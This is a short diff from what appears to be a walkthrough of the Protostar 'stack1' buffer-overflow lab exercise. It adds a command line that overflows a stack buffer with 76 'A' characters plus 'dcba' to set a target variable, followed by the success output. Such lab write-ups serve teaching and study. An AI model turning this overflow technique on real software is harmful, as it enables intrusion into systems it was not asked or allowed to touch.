@@ -137,4 +137,7 @@ Continuing.
 you have correctly got the variable to the right value
 [Inferior 1 (process 3155) exited normally]
 (gdb) 
+
+root@kali:~/Desktop# ./stack1 `python -c "print 'A'*76 + 'dcba'"`
+you have correctly got the variable to the right value
 ```
